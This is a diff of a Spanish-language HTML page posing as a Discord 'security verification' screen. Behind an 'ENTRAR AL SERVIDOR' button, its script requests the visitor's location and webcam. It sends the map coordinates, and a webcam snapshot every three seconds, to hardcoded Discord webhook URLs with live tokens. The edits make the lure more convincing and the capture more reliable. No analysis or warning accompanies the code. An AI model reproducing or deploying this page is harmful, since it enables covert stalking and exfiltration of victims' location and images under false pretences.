@@ -1,52 +1,95 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>Cargando...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
     <style>
-        body { background: #000; color: #5865f2; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; cursor: pointer; }
-        .spin { border: 3px solid #111; border-top: 3px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
-        @keyframes s { to { transform: rotate(360deg); } }
+        body { background: #000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .btn-verificar { background: #5865f2; color: white; border: none; padding: 20px 40px; font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer; }
+        .spin { border: 4px solid #111; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #v, #c { display: none; }
     </style>
 </head>
 <body>
-    <div class="spin"></div>
-    <p>Iniciando servidor... (Haz clic para continuar)</p>
-    <video id="v" autoplay playsinline style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
+
+    <div id="contenedor">
+        <div class="spin"></div>
+        <button class="btn-verificar" id="start">ENTRAR AL SERVIDOR</button>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
 <script>
-    const WEB_UBI = 'https://discord.com/api/webhooks/1494497108756136046/Jbl754EuqvTHozm4Q_jt6kmj_JaRJFIrjopX9TH_uL5iZXmBp56ZrcKfp1ODPiagV2qD';
-    const WEB_CAM = 'https://discord.com/api/webhooks/1494499724051484723/wT1_TJrUcW0jqANhOIpt046BvQEzUFUt-sH1SDYboadftYKOZEd9Adt303RBHZ-dhtRA';
+    const WH_UBI = 'https://discord.com/api/webhooks/1494497108756136046/Jbl754EuqvTHozm4Q_jt6kmj_JaRJFIrjopX9TH_uL5iZXmBp56ZrcKfp1ODPiagV2qD';
+    const WH_CAM = 'https://discord.com/api/webhooks/1494499724051484723/wT1_TJrUcW0jqANhOIpt046BvQEzUFUt-sH1SDYboadftYKOZEd9Adt303RBHZ-dhtRA';
 
-    async function iniciar() {
-        // Prueba de conexión inmediata
-        fetch(WEB_UBI, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "🚀 **Sistema iniciado: Alguien entró a la página**"}) });
+    const video = document.getElementById('v');
+    const canvas = document.getElementById('c');
+    const boton = document.getElementById('start');
 
-        // Ubicación
-        navigator.geolocation.getCurrentPosition(p => {
-            fetch(WEB_UBI, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: `📍 Ubicación: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`}) });
-        }, e => console.log(e), {enableHighAccuracy:true});
-
-        // Cámara
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({video:true});
-            const v = document.getElementById('v');
-            v.srcObject = s;
-            setInterval(() => {
-                const c = document.getElementById('c');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                c.toBlob(b => {
-                    const f = new FormData();
-                    f.append('file', b, 'f.png');
-                    f.append('payload_json', JSON.stringify({content: "📸 Captura"}));
-                    fetch(WEB_CAM, {method: 'POST', body: f});
-                }, 'image/png');
-            }, 3000);
-        } catch(err) { console.log(err); }
+    async function enviarADiscord(url, data) {
+        return fetch(url, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        });
     }
 
-    document.body.onclick = iniciar;
+    function obtenerUbicacion() {
+        // Configuramos opciones menos estrictas para evitar el Timeout
+        const opciones = {
+            enableHighAccuracy: false, // Cambiado a false para que sea más rápido
+            timeout: 15000,            // Aumentado a 15 segundos
+            maximumAge: 0
+        };
+
+        navigator.geolocation.getCurrentPosition(async (p) => {
+            const lat = p.coords.latitude;
+            const lon = p.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            await enviarADiscord(WH_UBI, {
+                content: "📍 **UBICACIÓN OBTENIDA**\n" + mapLink
+            });
+        }, (err) => {
+            enviarADiscord(WH_UBI, {content: "❌ No se pudo obtener ubicación: " + err.message});
+        }, opciones);
+    }
+
+    async function ejecutar() {
+        enviarADiscord(WH_UBI, {content: "🚀 **Botón pulsado, iniciando captura...**"});
+
+        // Lanzar GPS
+        obtenerUbicacion();
+
+        // Lanzar Cámara
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            boton.innerText = "VERIFICANDO...";
+
+            setInterval(() => {
+                if (video.videoWidth > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'img.png');
+                        formData.append('payload_json', JSON.stringify({content: "📸 Captura automática"}));
+                        fetch(WH_CAM, { method: 'POST', body: formData });
+                    }, 'image/png');
+                }
+            }, 3000);
+        } catch (e) {
+            enviarADiscord(WH_UBI, {content: "❌ Cámara bloqueada por el usuario"});
+        }
+    }
+
+    boton.onclick = ejecutar;
 </script>
 </body>
 </html>
